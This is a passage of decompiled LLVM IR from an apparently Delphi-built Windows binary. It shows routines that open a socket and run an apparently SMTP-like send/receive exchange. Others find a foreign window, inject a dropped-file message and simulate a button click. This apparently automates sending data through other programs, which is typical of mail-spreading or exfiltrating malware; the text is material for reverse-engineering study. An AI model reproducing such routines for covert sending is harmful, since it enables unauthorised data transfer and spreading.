  ret i32 %0, !insn.addr !1078
}

define i32 @function_405b60() local_unnamed_addr {
dec_label_pc_405b60:
  %stack_var_-12.0.reg2mem = alloca i32, !insn.addr !1079
  %0 = call i32 @function_4036f4(), !insn.addr !1080
  %1 = inttoptr i32 %0 to i8*, !insn.addr !1081
  %2 = call %hostent* @gethostbyname(i8* %1), !insn.addr !1082
  %3 = call i32 @"@FillChar"(), !insn.addr !1083
  %4 = icmp eq %hostent* %2, null, !insn.addr !1084
  br i1 %4, label %dec_label_pc_405bab, label %dec_label_pc_405b89, !insn.addr !1085

dec_label_pc_405b89:                              ; preds = %dec_label_pc_405b60
  %5 = ptrtoint %hostent* %2 to i32, !insn.addr !1082
  %6 = add i32 %5, 12, !insn.addr !1086
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1086
  %8 = load i32, i32* %7, align 4, !insn.addr !1086
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1087
  %10 = load i32, i32* %9, align 4, !insn.addr !1087
  %11 = inttoptr i32 %10 to i8*, !insn.addr !1088
  %12 = load i8, i8* %11, align 1, !insn.addr !1088
  %13 = sext i8 %12 to i32, !insn.addr !1089
  store i32 %13, i32* %stack_var_-12.0.reg2mem, !insn.addr !1090
  br label %dec_label_pc_405bab, !insn.addr !1090

dec_label_pc_405bab:                              ; preds = %dec_label_pc_405b89, %dec_label_pc_405b60
  %stack_var_-12.0.reload = load i32, i32* %stack_var_-12.0.reg2mem
  ret i32 %stack_var_-12.0.reload, !insn.addr !1091
}

define i32 @function_405bbc() local_unnamed_addr {
dec_label_pc_405bbc:
  %esp.0.reg2mem = alloca i32, !insn.addr !1092
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-488 = alloca i32, align 4
  %stack_var_-472 = alloca i32, align 4
  %stack_var_-412 = alloca i32, align 4
  %stack_var_-452 = alloca i32, align 4
  %1 = call i32 @function_4036e4(), !insn.addr !1093
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1094
  store i32 %2, i32* %stack_var_-452, align 4, !insn.addr !1094
  %3 = ptrtoint i32* %stack_var_-452 to i32, !insn.addr !1094
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1095
  %4 = ptrtoint i32* %stack_var_-412 to i32, !insn.addr !1096
  %5 = trunc i32 %4 to i16, !insn.addr !1096
  %6 = call i32 @WSAStartup(i16 %5, %WSAData* inttoptr (i32 257 to %WSAData*)), !insn.addr !1097
  store i32 2, i32* %stack_var_-472, align 4, !insn.addr !1098
  %7 = ptrtoint i32* %stack_var_-472 to i32, !insn.addr !1098
  %8 = call i32 @socket(i32 0, i32 1, i32 2), !insn.addr !1099
  %9 = icmp eq i32 %8, -1, !insn.addr !1100
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !1101
  br i1 %9, label %dec_label_pc_405c4a, label %dec_label_pc_405c0b, !insn.addr !1101

dec_label_pc_405c0b:                              ; preds = %dec_label_pc_405bbc
  %10 = call i32 @function_405b60(), !insn.addr !1102
  %11 = trunc i32 %10 to i16, !insn.addr !1103
  %12 = call i16 @htons(i16 %11), !insn.addr !1103
  store i32 %8, i32* %stack_var_-488, align 4, !insn.addr !1104
  %13 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !1104
  %14 = sext i16 %12 to i32, !insn.addr !1105
  %15 = call i32 @connect(i32 %14, %sockaddr* bitcast (i32* @0 to %sockaddr*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1105
  %16 = icmp eq i32 %15, 0, !insn.addr !1106
  %17 = icmp eq i1 %16, false, !insn.addr !1107
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !1107
  br i1 %17, label %dec_label_pc_405c4a, label %dec_label_pc_405c42, !insn.addr !1107

dec_label_pc_405c42:                              ; preds = %dec_label_pc_405c0b
  %18 = inttoptr i32 %0 to i32*, !insn.addr !1108
  store i32 %8, i32* %18, align 4, !insn.addr !1108
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !1109
  br label %dec_label_pc_405c4a, !insn.addr !1109

dec_label_pc_405c4a:                              ; preds = %dec_label_pc_405c42, %dec_label_pc_405c0b, %dec_label_pc_405bbc
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %19 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1110
  %20 = load i32, i32* %19, align 4, !insn.addr !1110
  call void @__writefsdword(i32 0, i32 %20), !insn.addr !1111
  %21 = add i32 %esp.0.reload, 8, !insn.addr !1112
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1112
  store i32 4217959, i32* %22, align 4, !insn.addr !1112
  %23 = call i32 @"@LStrClr"(), !insn.addr !1113
  ret i32 %23, !insn.addr !1114
}

define i32 @function_405c60() local_unnamed_addr {
dec_label_pc_405c60:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1115
  ret i32 %0, !insn.addr !1115
}

define i32 @function_405c65() local_unnamed_addr {
dec_label_pc_405c65:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1116
}

define i32 @function_405c67(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405c67:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1117
}

define i32 @function_405c70() local_unnamed_addr {
dec_label_pc_405c70:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @closesocket(i32 %0), !insn.addr !1118
  %2 = call i32 @WSACleanup(), !insn.addr !1119
  ret i32 %2, !insn.addr !1120
}

define i32 @function_405c7c() local_unnamed_addr {
dec_label_pc_405c7c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4105 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %1 = call i32 @function_4036e4(), !insn.addr !1121
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1122
  store i32 %2, i32* %stack_var_-4124, align 4, !insn.addr !1122
  %3 = ptrtoint i32* %stack_var_-4124 to i32, !insn.addr !1122
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1123
  %4 = call i32 @function_4036f4(), !insn.addr !1124
  %5 = call i32 @StrCopy(), !insn.addr !1125
  %6 = call i32 @function_407524(i32 4), !insn.addr !1126
  %7 = bitcast i32* %stack_var_-4105 to i8*
  %8 = call i32 @send(i32 %6, i8* nonnull %7, i32 %0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1127
  call void @__writefsdword(i32 0, i32 %0), !insn.addr !1128
  %9 = call i32 @"@LStrClr"(), !insn.addr !1129
  ret i32 %9, !insn.addr !1130
}

define i32 @function_405ced() local_unnamed_addr {
dec_label_pc_405ced:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1131
  ret i32 %0, !insn.addr !1131
}

define i32 @function_405cf2() local_unnamed_addr {
dec_label_pc_405cf2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1132
}

define i32 @function_405cf4(i32 %arg1) local_unnamed_addr {
dec_label_pc_405cf4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1133
}

define i32 @function_405cfc() local_unnamed_addr {
dec_label_pc_405cfc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @recv(i32 %0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1134
  %2 = call i32 @StrPas(), !insn.addr !1135
  ret i32 %2, !insn.addr !1136
}

define i32 @function_405d28(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_405d28:
  %esp.1.reg2mem = alloca i32, !insn.addr !1137
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !1137
  %esp.0.reg2mem = alloca i32, !insn.addr !1137
  %ecx.0.reg2mem = alloca i32, !insn.addr !1137
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1138
  store i32 8, i32* %ecx.0.reg2mem, !insn.addr !1139
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !1139
  br label %dec_label_pc_405d31, !insn.addr !1139

dec_label_pc_405d31:                              ; preds = %dec_label_pc_405d31, %dec_label_pc_405d28
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !1140
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1140
  store i32 0, i32* %2, align 4, !insn.addr !1140
  %3 = add i32 %esp.0.reload, -8, !insn.addr !1141
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1141
  store i32 0, i32* %4, align 4, !insn.addr !1141
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1142
  %6 = icmp eq i32 %5, 0, !insn.addr !1142
  %7 = icmp eq i1 %6, false, !insn.addr !1143
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !1143
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !1143
  br i1 %7, label %dec_label_pc_405d31, label %dec_label_pc_405d38, !insn.addr !1143

dec_label_pc_405d38:                              ; preds = %dec_label_pc_405d31
  %8 = add i32 %esp.0.reload, -12, !insn.addr !1144
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1144
  store i32 0, i32* %9, align 4, !insn.addr !1144
  %10 = call i32 @function_4036e4(), !insn.addr !1145
  %11 = call i32 @function_4036e4(), !insn.addr !1146
  %12 = call i32 @function_4036e4(), !insn.addr !1147
  %13 = call i32 @function_4036e4(), !insn.addr !1148
  %14 = call i32 @function_4036e4(), !insn.addr !1149
  %15 = call i32 @function_4036e4(), !insn.addr !1150
  %16 = call i32 @function_4036e4(), !insn.addr !1151
  %17 = add i32 %esp.0.reload, -20, !insn.addr !1152
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1152
  %19 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1152
  store i32 %19, i32* %18, align 4, !insn.addr !1152
  %20 = add i32 %esp.0.reload, -24, !insn.addr !1153
  %21 = inttoptr i32 %20 to i32*, !insn.addr !1153
  store i32 4218781, i32* %21, align 4, !insn.addr !1153
  %22 = call i32 @__readfsdword(i32 0), !insn.addr !1154
  %23 = add i32 %esp.0.reload, -28, !insn.addr !1154
  %24 = inttoptr i32 %23 to i32*
  store i32 %22, i32* %24, align 4, !insn.addr !1154
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1155
  %25 = call i32 @function_405bbc(), !insn.addr !1156
  %26 = icmp eq i32 %25, 0, !insn.addr !1157
  store i32* %24, i32** %.pre-phi.reg2mem, !insn.addr !1158
  store i32 %23, i32* %esp.1.reg2mem, !insn.addr !1158
  br i1 %26, label %dec_label_pc_405f68, label %dec_label_pc_405da6, !insn.addr !1158

dec_label_pc_405da6:                              ; preds = %dec_label_pc_405d38
  %27 = add i32 %esp.0.reload, -32, !insn.addr !1159
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1159
  store i32 ptrtoint ([6 x i8]* @global_var_405fb8 to i32), i32* %28, align 4, !insn.addr !1159
  %29 = add i32 %esp.0.reload, -36, !insn.addr !1160
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1160
  %31 = add i32 %esp.0.reload, -40, !insn.addr !1161
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1161
  store i32 ptrtoint ([3 x i8]* @global_var_405fc8 to i32), i32* %32, align 4, !insn.addr !1161
  %33 = call i32 @"@LStrCatN"(), !insn.addr !1162
  %34 = call i32 @function_405c7c(), !insn.addr !1163
  %35 = call i32 @function_405cfc(), !insn.addr !1164
  %36 = call i32 @function_405c7c(), !insn.addr !1165
  %37 = call i32 @function_405cfc(), !insn.addr !1166
  %38 = call i32 @"@LStrCat"(), !insn.addr !1167
  %39 = call i32 @function_405c7c(), !insn.addr !1168
  %40 = call i32 @function_405cfc(), !insn.addr !1169
  %41 = call i32 @"@LStrCat"(), !insn.addr !1170
  %42 = call i32 @function_405c7c(), !insn.addr !1171
  %43 = call i32 @function_405cfc(), !insn.addr !1172
  %44 = add i32 %esp.0.reload, -44, !insn.addr !1173
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1173
  store i32 ptrtoint ([13 x i8]* @global_var_405fec to i32), i32* %45, align 4, !insn.addr !1173
  %46 = add i32 %esp.0.reload, -48, !insn.addr !1174
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1174
  store i32 %arg1, i32* %47, align 4, !insn.addr !1174
  %48 = add i32 %esp.0.reload, -52, !insn.addr !1175
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1175
  store i32 ptrtoint (i32* @global_var_406004 to i32), i32* %49, align 4, !insn.addr !1175
  %50 = add i32 %esp.0.reload, -56, !insn.addr !1176
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1176
  store i32 ptrtoint ([3 x i8]* @global_var_405fc8 to i32), i32* %51, align 4, !insn.addr !1176
  %52 = call i32 @"@LStrCatN"(), !insn.addr !1177
  %53 = call i32 @function_405c7c(), !insn.addr !1178
  %54 = call i32 @function_405cfc(), !insn.addr !1179
  %55 = add i32 %esp.0.reload, -60, !insn.addr !1180
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1180
  store i32 ptrtoint ([11 x i8]* @global_var_406010 to i32), i32* %56, align 4, !insn.addr !1180
  %57 = add i32 %esp.0.reload, -64, !insn.addr !1181
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1181
  store i32 %arg2, i32* %58, align 4, !insn.addr !1181
  %59 = add i32 %esp.0.reload, -68, !insn.addr !1182
  %60 = inttoptr i32 %59 to i32*, !insn.addr !1182
  store i32 ptrtoint (i32* @global_var_406004 to i32), i32* %60, align 4, !insn.addr !1182
  %61 = add i32 %esp.0.reload, -72, !insn.addr !1183
  %62 = inttoptr i32 %61 to i32*, !insn.addr !1183
  store i32 ptrtoint ([3 x i8]* @global_var_405fc8 to i32), i32* %62, align 4, !insn.addr !1183
  %63 = call i32 @"@LStrCatN"(), !insn.addr !1184
  %64 = call i32 @function_405c7c(), !insn.addr !1185
  %65 = call i32 @function_405cfc(), !insn.addr !1186
  %66 = call i32 @function_405c7c(), !insn.addr !1187
  %67 = call i32 @function_405cfc(), !insn.addr !1188
  %68 = add i32 %esp.0.reload, -76, !insn.addr !1189
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1189
  store i32 ptrtoint ([8 x i8]* @global_var_406034 to i32), i32* %69, align 4, !insn.addr !1189
  %70 = add i32 %esp.0.reload, -80, !insn.addr !1190
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1190
  store i32 %arg1, i32* %71, align 4, !insn.addr !1190
  %72 = add i32 %esp.0.reload, -84, !insn.addr !1191
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1191
  store i32 ptrtoint (i32* @global_var_406004 to i32), i32* %73, align 4, !insn.addr !1191
  %74 = add i32 %esp.0.reload, -88, !insn.addr !1192
  %75 = inttoptr i32 %74 to i32*, !insn.addr !1192
  store i32 ptrtoint ([3 x i8]* @global_var_405fc8 to i32), i32* %75, align 4, !insn.addr !1192
  %76 = add i32 %esp.0.reload, -92, !insn.addr !1193
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1193
  store i32 ptrtoint ([6 x i8]* @global_var_406044 to i32), i32* %77, align 4, !insn.addr !1193
  %78 = add i32 %esp.0.reload, -96, !insn.addr !1194
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1194
  store i32 %arg2, i32* %79, align 4, !insn.addr !1194
  %80 = add i32 %esp.0.reload, -100, !insn.addr !1195
  %81 = inttoptr i32 %80 to i32*, !insn.addr !1195
  store i32 ptrtoint (i32* @global_var_406004 to i32), i32* %81, align 4, !insn.addr !1195
  %82 = add i32 %esp.0.reload, -104, !insn.addr !1196
  %83 = inttoptr i32 %82 to i32*, !insn.addr !1196
  store i32 ptrtoint ([3 x i8]* @global_var_405fc8 to i32), i32* %83, align 4, !insn.addr !1196
  %84 = add i32 %esp.0.reload, -108, !insn.addr !1197
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1197
  store i32 ptrtoint ([10 x i8]* @global_var_406054 to i32), i32* %85, align 4, !insn.addr !1197
  %86 = add i32 %esp.0.reload, -112, !insn.addr !1198
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1198
  store i32 %arg3, i32* %87, align 4, !insn.addr !1198
  %88 = add i32 %esp.0.reload, -116, !insn.addr !1199
  %89 = inttoptr i32 %88 to i32*, !insn.addr !1199
  store i32 ptrtoint ([3 x i8]* @global_var_405fc8 to i32), i32* %89, align 4, !insn.addr !1199
  %90 = add i32 %esp.0.reload, -120, !insn.addr !1200
  %91 = inttoptr i32 %90 to i32*, !insn.addr !1200
  store i32 ptrtoint ([3 x i8]* @global_var_405fc8 to i32), i32* %91, align 4, !insn.addr !1200
  %92 = add i32 %esp.0.reload, -124, !insn.addr !1201
  %93 = inttoptr i32 %92 to i32*, !insn.addr !1201
  store i32 %arg4, i32* %93, align 4, !insn.addr !1201
  %94 = add i32 %esp.0.reload, -128, !insn.addr !1202
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1202
  store i32 ptrtoint ([3 x i8]* @global_var_405fc8 to i32), i32* %95, align 4, !insn.addr !1202
  %96 = add i32 %esp.0.reload, -132, !insn.addr !1203
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1203
  store i32 ptrtoint (i32* @global_var_406068 to i32), i32* %97, align 4, !insn.addr !1203
  %98 = add i32 %esp.0.reload, -136, !insn.addr !1204
  %99 = inttoptr i32 %98 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_405fc8 to i32), i32* %99, align 4, !insn.addr !1204
  %100 = call i32 @"@LStrCatN"(), !insn.addr !1205
  %101 = call i32 @function_405c7c(), !insn.addr !1206
  %102 = call i32 @function_405cfc(), !insn.addr !1207
  %103 = call i32 @function_405c7c(), !insn.addr !1208
  %104 = call i32 @function_405cfc(), !insn.addr !1209
  %105 = call i32 @function_405c70(), !insn.addr !1210
  store i32* %99, i32** %.pre-phi.reg2mem, !insn.addr !1211
  store i32 %98, i32* %esp.1.reg2mem, !insn.addr !1211
  br label %dec_label_pc_405f68, !insn.addr !1211

dec_label_pc_405f68:                              ; preds = %dec_label_pc_405da6, %dec_label_pc_405d38
  %106 = add i32 %esp.0.reload, -16, !insn.addr !1212
  %107 = inttoptr i32 %106 to i32*, !insn.addr !1212
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %108 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1213
  call void @__writefsdword(i32 0, i32 %108), !insn.addr !1214
  %109 = add i32 %esp.1.reload, 8, !insn.addr !1215
  %110 = inttoptr i32 %109 to i32*, !insn.addr !1215
  store i32 4218788, i32* %110, align 4, !insn.addr !1215
  %111 = call i32 @"@LStrArrayClr"(), !insn.addr !1216
  %112 = call i32 @"@LStrArrayClr"(), !insn.addr !1217
  %113 = call i32 @"@LStrArrayClr"(), !insn.addr !1218
  ret i32 %113, !insn.addr !1219
}

define i32 @function_405f9d() local_unnamed_addr {
dec_label_pc_405f9d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1220
  ret i32 %0, !insn.addr !1220
}

define i32 @function_405fa2() local_unnamed_addr {
dec_label_pc_405fa2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1221
}

define i32 @function_405fa4(i32 %arg1) local_unnamed_addr {
dec_label_pc_405fa4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1222
}

define i32 @function_40606f() local_unnamed_addr {
dec_label_pc_40606f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1223
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1223
  store i32 %3, i32* %4, align 4, !insn.addr !1223
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1224
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1224
  %9 = add i8 %6, %8, !insn.addr !1224
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1224
  store i8 %9, i8* %10, align 1, !insn.addr !1224
  %11 = add i32 %2, 85, !insn.addr !1225
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1225
  %13 = load i8, i8* %12, align 1, !insn.addr !1225
  %14 = trunc i32 %1 to i8, !insn.addr !1225
  %15 = add i8 %13, %14, !insn.addr !1225
  store i8 %15, i8* %12, align 1, !insn.addr !1225
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1226
  store i32 %16, i32* %stack_var_-16, align 4, !insn.addr !1226
  %17 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1226
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1227
  %18 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1228
  %19 = add i32 %18, 1, !insn.addr !1228
  %20 = icmp eq i32 %19, 0, !insn.addr !1228
  store i32 %19, i32* @global_var_4096c0, align 4, !insn.addr !1228
  %21 = icmp eq i1 %20, false, !insn.addr !1229
  br i1 %21, label %dec_label_pc_4060a9, label %dec_label_pc_406095, !insn.addr !1229

dec_label_pc_406095:                              ; preds = %dec_label_pc_40606f
  %22 = call i32 @"@LStrClr"(), !insn.addr !1230
  %23 = call i32 @"@LStrClr"(), !insn.addr !1231
  br label %dec_label_pc_4060a9, !insn.addr !1231

dec_label_pc_4060a9:                              ; preds = %dec_label_pc_406095, %dec_label_pc_40606f
  %24 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1232
  call void @__writefsdword(i32 0, i32 %24), !insn.addr !1233
  ret i32 0, !insn.addr !1234
}

define i32 @function_4060b7() local_unnamed_addr {
dec_label_pc_4060b7:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1235
  ret i32 %0, !insn.addr !1235
}

define i32 @function_4060bc() local_unnamed_addr {
dec_label_pc_4060bc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1236
}

define i32 @function_4060be(i32 %arg1) local_unnamed_addr {
dec_label_pc_4060be:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1237
}

define i32 @function_4060c0() local_unnamed_addr {
dec_label_pc_4060c0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1238
  %2 = add i32 %1, -1, !insn.addr !1238
  store i32 %2, i32* @global_var_4096c0, align 4, !insn.addr !1238
  ret i32 %0, !insn.addr !1239
}

define i32 @function_4060c8() local_unnamed_addr {
dec_label_pc_4060c8:
  %esp.0.reg2mem = alloca i32, !insn.addr !1240
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-64 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-28 = alloca i8*, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1241
  %2 = icmp eq i32 %0, 0, !insn.addr !1242
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1243
  br i1 %2, label %dec_label_pc_4061d2, label %dec_label_pc_4060e2, !insn.addr !1243

dec_label_pc_4060e2:                              ; preds = %dec_label_pc_4060c8
  %3 = call i32 @function_4036f4(), !insn.addr !1244
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1245
  store i8* %4, i8** %stack_var_-28, align 4, !insn.addr !1245
  %5 = ptrtoint i8** %stack_var_-28 to i32, !insn.addr !1245
  %6 = call i1 @PathFileExistsA(i8* %4), !insn.addr !1246
  %7 = icmp eq i1 %6, false, !insn.addr !1247
  store i32 %5, i32* %esp.0.reg2mem, !insn.addr !1248
  br i1 %7, label %dec_label_pc_4061d2, label %dec_label_pc_4060fd, !insn.addr !1248

dec_label_pc_4060fd:                              ; preds = %dec_label_pc_4060e2
  %8 = load i8*, i8** %stack_var_-28, align 4
  %9 = call i32* @FindWindowExA(i32* null, i32* bitcast ([7 x i8]* @global_var_4061e0 to i32*), i8* null, i8* %8), !insn.addr !1249
  %10 = ptrtoint i32* %9 to i32, !insn.addr !1249
  store i32 %10, i32* %stack_var_-48, align 4, !insn.addr !1250
  %11 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1250
  %12 = call i1 @IsWindow(i32* %9), !insn.addr !1251
  %13 = icmp eq i1 %12, false, !insn.addr !1252
  store i32 %11, i32* %esp.0.reg2mem, !insn.addr !1253
  br i1 %13, label %dec_label_pc_4061d2, label %dec_label_pc_406126, !insn.addr !1253

dec_label_pc_406126:                              ; preds = %dec_label_pc_4060fd
  %14 = call i32 @function_4034f4(), !insn.addr !1254
  %15 = add i32 %14, 22, !insn.addr !1255
  store i32 66, i32* %stack_var_-56, align 4, !insn.addr !1256
  %16 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1256
  %17 = call i32* @GlobalAlloc(i32 %15, i32 66), !insn.addr !1257
  %18 = icmp eq i32* %17, null, !insn.addr !1258
  store i32 %16, i32* %esp.0.reg2mem, !insn.addr !1259
  br i1 %18, label %dec_label_pc_4061d2, label %dec_label_pc_406145, !insn.addr !1259

dec_label_pc_406145:                              ; preds = %dec_label_pc_406126
  %19 = call i32* @GlobalLock(i32* nonnull %17), !insn.addr !1260
  %20 = icmp eq i32* %19, null, !insn.addr !1261
  %21 = icmp eq i1 %20, false, !insn.addr !1262
  br i1 %21, label %dec_label_pc_406159, label %dec_label_pc_406151, !insn.addr !1262

dec_label_pc_406151:                              ; preds = %dec_label_pc_406145
  %22 = bitcast i32* %17 to i8*, !insn.addr !1263
  store i8* %22, i8** %stack_var_-64, align 4, !insn.addr !1263
  %23 = ptrtoint i8** %stack_var_-64 to i32, !insn.addr !1263
  %24 = call i32* @GlobalFree(i32* nonnull %17), !insn.addr !1264
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1265
  br label %dec_label_pc_4061d2, !insn.addr !1265

dec_label_pc_406159:                              ; preds = %dec_label_pc_406145
  %25 = ptrtoint i32* %17 to i32, !insn.addr !1257
  %26 = ptrtoint i32* %19 to i32, !insn.addr !1260
  store i32 20, i32* %19, align 4, !insn.addr !1266
  %27 = add i32 %26, 4, !insn.addr !1267
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1267
  store i32 0, i32* %28, align 4, !insn.addr !1267
  %29 = add i32 %26, 8, !insn.addr !1268
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1268
  store i32 0, i32* %30, align 4, !insn.addr !1268
  %31 = add i32 %26, 12, !insn.addr !1269
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1269
  store i32 0, i32* %32, align 4, !insn.addr !1269
  %33 = add i32 %26, 16, !insn.addr !1270
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1270
  store i32 0, i32* %34, align 4, !insn.addr !1270
  %35 = call i32 @function_4036f4(), !insn.addr !1271
  %36 = inttoptr i32 %35 to i8*, !insn.addr !1272
  store i8* %36, i8** %stack_var_-64, align 4, !insn.addr !1272
  %37 = add i32 %26, 20, !insn.addr !1273
  %38 = inttoptr i32 %37 to i8*, !insn.addr !1274
  %39 = call i8* @lstrcpyA(i8* %36, i8* %38), !insn.addr !1275
  %40 = call i1 @GlobalUnlock(i32* nonnull %17), !insn.addr !1276
  %41 = call i1 @PostMessageA(i32* null, i32 %25, i32 563, i32 %10), !insn.addr !1277
  %42 = call i32 @function_407484(i32 4219368, i32 2000, i32 -1), !insn.addr !1278
  store i32 %42, i32* %stack_var_-104, align 4, !insn.addr !1279
  %43 = ptrtoint i32* %stack_var_-104 to i32, !insn.addr !1279
  %44 = inttoptr i32 %42 to i32*, !insn.addr !1280
  %45 = call i1 @IsWindow(i32* %44), !insn.addr !1280
  %46 = icmp eq i1 %45, false, !insn.addr !1281
  store i32 %43, i32* %esp.0.reg2mem, !insn.addr !1282
  br i1 %46, label %dec_label_pc_4061d2, label %dec_label_pc_4061c3, !insn.addr !1282

dec_label_pc_4061c3:                              ; preds = %dec_label_pc_406159
  store i32 %42, i32* %stack_var_-120, align 4, !insn.addr !1283
  %47 = ptrtoint i32* %stack_var_-120 to i32, !insn.addr !1283
  %48 = call i32 @SendMessageA(i32* null, i32 0, i32 245, i32 %42), !insn.addr !1284
  store i32 %47, i32* %esp.0.reg2mem, !insn.addr !1284
  br label %dec_label_pc_4061d2, !insn.addr !1284

dec_label_pc_4061d2:                              ; preds = %dec_label_pc_4061c3, %dec_label_pc_406159, %dec_label_pc_406151, %dec_label_pc_406126, %dec_label_pc_4060fd, %dec_label_pc_4060e2, %dec_label_pc_4060c8
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %49 = add i32 %esp.0.reload, 4, !insn.addr !1285
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1285
  %51 = load i32, i32* %50, align 4, !insn.addr !1285
  ret i32 %51, !insn.addr !1286
}

define i32 @function_4061dd(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_4061dd:
  %ebp.0.reg2mem = alloca i32, !insn.addr !1287
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %ebx = alloca i32, align 4
  %3 = call i32 @__decompiler_undefined_function_0()
